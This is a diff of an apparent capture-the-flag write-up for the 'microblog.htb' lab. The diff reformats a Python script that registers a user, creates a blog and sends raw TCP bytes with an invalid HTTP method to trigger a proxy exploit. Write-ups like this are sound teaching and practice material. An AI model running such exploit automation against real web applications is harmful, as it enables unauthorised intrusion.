@@ -450,8 +450,7 @@ Nice!
 
 The users are getting wiped quite frequently, and automating that looked like a fun exercise. Also because python requests wouldn't let us do the cool trick did with curl, using an invalid HTTP method... I had to do it in raw bytes in a TCP socket. I think it helped me a lot in getting a better understanding of how the proxy exploit works since we're working directly with what the actual bytes look like in the HTTP request. 
 ```python
-mport requests
-import json
+import requests
 import socket
 from simple_chalk import green
 import sys
@@ -459,7 +458,7 @@ import sys
 
 PROXY = 'http://127.0.0.1:8080'
 DOMAIN = 'microblog.htb'
-HEADERS = { 'Content-Type': 'application/x-www-form-urlencoded' }
+HEADERS = {'Content-Type': 'application/x-www-form-urlencoded'}
 USER = sys.argv[1]
 
 
@@ -472,7 +471,10 @@ def login():
 
 
 def register():
-    data = f'first-name={USER}&last-name={USER}&username={USER}&password={USER}'
+    data = f'first-name={USER}&'\
+           f'last-name={USER}&'\
+           f'username={USER}&'\
+           f'password={USER}'
     url = f'http://app.{DOMAIN}/register/index.php'
     res = requests.post(url, data, headers=HEADERS, proxies={'http': PROXY})
     if 'successful' in res.url:
@@ -481,14 +483,19 @@ def register():
     if 'already' in res.url:
         print(f'{green("[+]")} User already exists')
         cookie = login()
-    #print(f'{green("[+]")} {cookie}')
     return cookie
 
 
 def create_blog(cookies):
     data = f'new-blog-name={USER}'
     url = f'http://app.{DOMAIN}/dashboard/index.php'
-    res = requests.post(url, data, headers=HEADERS, cookies=cookies, proxies={'http': PROXY})
+    res = requests.post(
+        url,
+        data,
+        headers=HEADERS,
+        cookies=cookies,
+        proxies={'http': PROXY}
+    )
     if 'already' in res.url:
         print(f'{green("[+]")} Blog already exists')
     if 'successful' in res.url:
@@ -510,10 +517,12 @@ def brush_like_a_pro():
     if '502 Bad Gateway' in res.decode():
         print(f'{green("[+]")} You can now brush like a pro 🪥')
 
+
 if __name__ == "__main__":
     cookies = register()
     create_blog(cookies)
     brush_like_a_pro()
+
 ```
 
 ```bash
